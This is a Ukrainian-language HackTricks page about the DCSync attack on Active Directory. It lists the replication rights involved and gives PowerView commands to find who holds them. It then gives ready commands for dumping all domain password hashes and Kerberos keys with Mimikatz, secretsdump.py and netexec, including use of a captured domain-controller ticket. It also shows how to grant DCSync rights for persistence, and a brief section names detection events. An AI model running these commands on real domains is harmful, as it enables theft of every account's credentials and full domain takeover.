# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Дозвіл **DCSync** означає наявність таких дозволів для самого домену: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** і **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Важливі примітки щодо DCSync:**

- **Атака DCSync імітує поведінку контролера домену та запитує інші контролери домену про реплікацію інформації** за допомогою Directory Replication Service Remote Protocol (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, його не можна вимкнути чи деактивувати.
- За замовчуванням необхідні привілеї мають лише групи **Domain Admins, Enterprise Admins, Administrators і Domain Controllers**.
- На практиці для **повного DCSync** потрібні **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** для контексту іменування домену. `DS-Replication-Get-Changes-In-Filtered-Set` часто делегують разом із ними, але окремо цей дозвіл більше стосується синхронізації **конфіденційних атрибутів / атрибутів, відфільтрованих для RODC** (наприклад, секретів у стилі застарілого LAPS), а не повного дампу krbtgt.<sup>[[2]](#references)</sup>
- Якщо паролі деяких облікових записів зберігаються із застосуванням оборотного шифрування, у Mimikatz є параметр, який дає змогу вивести пароль у відкритому вигляді.

### Перерахування

Перевірте, хто має ці дозволи, за допомогою `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Якщо потрібно зосередитися на **нестандартних суб'єктах безпеки** з правами DCSync, відфільтруйте вбудовані групи, здатні до реплікації, і перевірте лише неочікувані суб'єкти безпеки:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit локально

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Віддалена експлуатація

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Практичні приклади з обмеженою сферою застосування:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync using a captured DC machine TGT (ccache)

Під час перевірки служби на контролері домену розрізняйте її локальну ідентичність служби та мережеву ідентичність. [Microsoft документує](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), що віртуальні облікові записи SQL Server (`NT SERVICE\...`) отримують доступ до мережевих ресурсів як обліковий запис комп’ютера-хоста. На контролері домену через це обліковий запис комп’ютера DC може бути важливим під час перевірки прав на реплікацію, але сам по собі доступ до служби не підтверджує наявність експортованого машинного TGT або придатної для DCSync автентифікації. Перш ніж розглядати це як можливий шлях, перевірте фактичну ідентичність служби, контекст вихідної автентифікації, наявні квитки або облікові дані та ефективні права на реплікацію.

У сценаріях export-mode з unconstrained delegation можна перехопити машинний TGT контролера домену (наприклад, `DC1$@DOMAIN` для `krbtgt@DOMAIN`). Потім можна використати цей ccache для автентифікації від імені DC і виконання DCSync без пароля.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Операційні примітки:

- **Kerberos-шлях Impacket спершу звертається до SMB**, а вже потім виконує виклик DRSUAPI. Якщо в середовищі ввімкнено **перевірку цільового імені SPN**, повний дамп може завершитися помилкою: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- У такому разі спершу запросіть service ticket **`cifs/<dc>`** для цільового DC або скористайтеся **`-just-dc-user`**, щоб негайно отримати дані потрібного облікового запису.
- Якщо у вас є лише обмежені права на реплікацію, синхронізація в стилі LDAP/DirSync усе одно може розкрити **конфіденційні** атрибути або атрибути, **відфільтровані для RODC** (наприклад, застарілий `ms-Mcs-AdmPwd`) без повної реплікації krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` створює 3 файли:

- один із **NTLM-хешами**
- один із **Kerberos-ключами**
- один із паролями у відкритому вигляді з NTDS для всіх облікових записів, у яких увімкнено [**оборотне шифрування**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Отримати користувачів із увімкненим оборотним шифруванням можна за допомогою

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Закріплення

Якщо ви адміністратор домену, за допомогою PowerView можна надати ці дозволи будь-якому користувачеві:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Оператори Linux можуть зробити те саме за допомогою `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Потім можна **перевірити, чи правильно призначено користувачеві** 3 привілеї, знайшовши їх у виводі (ви маєте побачити назви привілеїв у полі "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Пом’якшення наслідків

- Security Event ID 4662 (для об’єкта потрібно ввімкнути Audit Policy) — виконано операцію над об’єктом<sup>[[4]](#references)</sup>
- Security Event ID 5136 (для об’єкта потрібно ввімкнути Audit Policy) — змінено об’єкт служби каталогів
- Security Event ID 4670 (для об’єкта потрібно ввімкнути Audit Policy) — змінено дозволи на об’єкт
- AD ACL Scanner — створюйте та порівнюйте звіти ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Журнал змін Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: використання Get-Changes і Get-Changes-In-Filtered-Set для реплікації](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: отримання хешів паролів із контролера домену](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — облікові дані SYSVOL → цільовий Kerberoast → необмежене делегування → DCSync для DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
